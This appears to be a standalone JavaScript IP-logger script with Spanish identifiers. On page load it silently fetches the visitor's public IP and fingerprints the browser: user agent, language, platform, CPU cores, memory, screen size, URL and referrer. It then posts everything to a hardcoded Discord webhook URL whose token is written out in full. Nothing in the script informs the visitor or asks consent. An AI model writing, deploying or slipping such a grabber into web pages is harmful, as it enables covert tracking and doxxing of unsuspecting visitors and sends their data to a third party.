async function obtenerIP() {
  try {
    const respuesta = await fetch('https://api.ipify.org?format=json');
    const datos = await respuesta.json();
    return datos.ip;
  } catch (error) {
    console.error('Error al obtener la IP:', error);
    return 'No se pudo obtener IP';
  }
}

function obtenerInfoAvanzada() {
  return {
    userAgent: navigator.userAgent,
    idioma: navigator.language,
    plataforma: navigator.platform,
    cookies: navigator.cookieEnabled,
    hardware: {
      cpu: navigator.hardwareConcurrency,
      memoria: navigator.deviceMemory,
      touch: navigator.maxTouchPoints
    },
    pantalla: {
      ancho: screen.width,
      alto: screen.height,
      color: screen.colorDepth
    },
    url: window.location.href,
    referrer: document.referrer
  };
}

async function enviarDatosDiscord() {
  const ip = await obtenerIP();
  const info = obtenerInfoAvanzada();

  const contenido = `
📡 **IP:** ${ip}
🌐 **URL:** ${info.url}
🔁 **Referrer:** ${info.referrer}
🧠 **User-Agent:** ${info.userAgent}
🗣️ **Idioma:** ${info.idioma}
💻 **Plataforma:** ${info.plataforma}
🍪 **Cookies habilitadas:** ${info.cookies}
🧮 **Núcleos CPU:** ${info.hardware.cpu}
📈 **Memoria:** ${info.hardware.memoria} GB
📱 **Puntos táctiles:** ${info.hardware.touch}
🖥️ **Pantalla:** ${info.pantalla.ancho}x${info.pantalla.alto} (${info.pantalla.color} bits)
🕒 **Fecha:** ${new Date().toLocaleString()}
`;

  await fetch('https://discord.com/api/webhooks/1393779023548776591/tLNcOb11GsA956uIzaLifR7FUSvRlfYlnYDq2aiSdU0Ecwvl6gE7flf79MKQ123CnJVY', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: contenido })
  })
  .then(res => {
    if (res.ok) {
      console.log('✅ Enviado a Discord.');
    } else {
      console.error('❌ Error al enviar:', res.status);
    }
  })
  .catch(err => console.error('❌ Error en petición:', err));
}

window.addEventListener('load', () => {
  enviarDatosDiscord();
});
